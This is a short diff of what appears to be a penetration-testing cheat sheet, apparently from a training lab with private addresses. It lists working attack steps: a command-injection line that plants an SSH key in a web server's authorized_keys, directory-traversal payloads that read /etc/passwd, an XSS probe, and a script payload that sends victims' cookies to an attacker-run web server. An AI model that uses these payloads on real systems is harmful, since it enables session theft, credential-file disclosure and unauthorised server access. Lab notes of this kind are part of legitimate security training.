@@ -138,4 +138,14 @@ ssh-keygen
 ; echo "; MIIEowIBAAKCAQEAp...FKBkhbB+mcAc138dUCCFdt" >> /var/www/.ssh/authorized_keys
 #Create MS socket to the web server using private ssh key and www-data creds 
 ssh -i .ssh/id_rsa -MS /tmp/web www-data@10.50.28.11
+#Directory Traversal using a built in tool using cat POST Method
+../../../../../../../../etc/passwd
+#Directory Traversal using a built in tool using cat GET Method
+http://10.50.28.11/path/pathdemo.php?myfile=../../../../../../../../etc/passwd
+#To find if XXS is possible 
+<script>alert('XSS!');</script>
+#Create http server on Lin-ops
+python3 -m http.server
+#add script to server that redirects victim to your web server and sends you cookie
+<script>document.location="http://10.50.40.70:8000/?" + document.cookie;</script>
         
